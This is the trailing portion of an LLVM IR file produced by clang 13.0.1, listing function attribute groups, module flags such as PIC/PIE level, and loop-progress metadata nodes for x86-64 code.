attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { argmemonly nofree nounwind willreturn }
attributes #4 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { noreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #9 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { nounwind }
attributes #12 = { nounwind readonly willreturn }
attributes #13 = { noreturn }
attributes #14 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
